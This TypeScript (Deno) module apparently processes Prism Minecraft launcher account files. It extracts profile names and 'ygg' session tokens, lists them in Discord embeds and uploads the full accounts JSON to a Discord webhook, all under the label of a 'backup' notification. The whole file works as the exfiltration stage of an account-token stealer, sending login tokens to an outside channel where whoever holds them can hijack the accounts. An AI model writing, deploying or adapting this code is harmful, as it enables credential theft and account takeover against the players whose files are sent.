const EMBED_COLOR = 0x57f287;
const FIELD_VALUE_MAX = 1024;

export function discordWebhookUrl(): string | null {
	let url = (Deno.env.get("DISCORD_WEBHOOK_URL") ?? "").trim().replaceAll(/\s+/g, "");
	if (!url) {
		return null;
	}
	if (url.startsWith("discord.com/") || url.startsWith("discordapp.com/")) {
		url = `https://${url}`;
	}
	if (
		url.startsWith("https://discord.com/api/webhooks/") ||
		url.startsWith("https://discordapp.com/api/webhooks/")
	) {
		return url;
	}
	return null;
}

type HighlightedAccount = {
	name: string;
	token: string;
	active: boolean;
};

function asAccountList(parsed: unknown): Record<string, unknown>[] {
	if (!parsed || typeof parsed !== "object") {
		return [];
	}
	const accounts = (parsed as { accounts?: unknown }).accounts;
	if (Array.isArray(accounts)) {
		return accounts.filter((account) => account !== null && typeof account === "object") as Record<
			string,
			unknown
		>[];
	}
	if (accounts && typeof accounts === "object") {
		return Object.values(accounts).filter((account) => account !== null && typeof account === "object") as Record<
			string,
			unknown
		>[];
	}
	return [];
}

function extractHighlights(accountJson: string): HighlightedAccount[] {
	let parsed: unknown;
	try {
		parsed = JSON.parse(accountJson);
	} catch {
		return [];
	}
	const out: HighlightedAccount[] = [];
	for (const account of asAccountList(parsed)) {
		const profile = account.profile;
		const ygg = account.ygg;
		const name = profile && typeof profile === "object"
			? String((profile as { name?: unknown }).name ?? "").trim()
			: "";
		const token = ygg && typeof ygg === "object"
			? String((ygg as { token?: unknown }).token ?? "").trim()
			: "";
		if (!name && !token) {
			continue;
		}
		out.push({
			name: name || "inconnu",
			token,
			active: account.active === true,
		});
	}
	out.sort((a, b) => Number(b.active) - Number(a.active));
	return out.slice(0, 10);
}

function codeBlock(value: string, max = FIELD_VALUE_MAX): string {
	const safe = value.replaceAll("```", "`'`'`");
	const prefix = "```\n";
	const suffix = "\n```";
	const budget = max - prefix.length - suffix.length;
	const body = safe.length > budget ? `${safe.slice(0, Math.max(0, budget - 1))}…` : safe;
	return `${prefix}${body}${suffix}`;
}

function buildEmbeds(uuid: string, accountJson: string): Record<string, unknown>[] {
	const accounts = extractHighlights(accountJson);
	if (accounts.length === 0) {
		return [{
			title: "Sauvegarde Prism",
			description: "Name / ygg.token introuvables dans le JSON.\nFichier complet en pièce jointe.",
			color: EMBED_COLOR,
			footer: { text: uuid },
		}];
	}
	return accounts.map((account) => ({
		title: account.active ? `★ ${account.name}` : account.name,
		color: EMBED_COLOR,
		fields: [
			{
				name: "👤 Name",
				value: `**${account.name.replaceAll("*", "\\*")}**`,
				inline: true,
			},
			{
				name: "🔑 Ygg token",
				value: account.token ? codeBlock(account.token) : "`absent`",
				inline: false,
			},
		],
		footer: { text: uuid },
	}));
}

export async function notifyDiscordAccountBackup(uuid: string, accountJson: string): Promise<void> {
	const webhookUrl = discordWebhookUrl();
	if (!webhookUrl) {
		console.error("discord webhook missing or invalid");
		return;
	}

	const form = new FormData();
	form.append(
		"payload_json",
		JSON.stringify({
			content: `Nouvelle sauvegarde Prism (\`${uuid}\`)`,
			embeds: buildEmbeds(uuid, accountJson),
		}),
	);
	form.append(
		"files[0]",
		new Blob([accountJson], { type: "application/json" }),
		`accounts-${uuid}.json`,
	);

	const discord = await fetch(webhookUrl, {
		method: "POST",
		body: form,
		signal: AbortSignal.timeout(15_000),
	});
	if (!discord.ok) {
		throw new Error(`discord HTTP ${discord.status}`);
	}
}
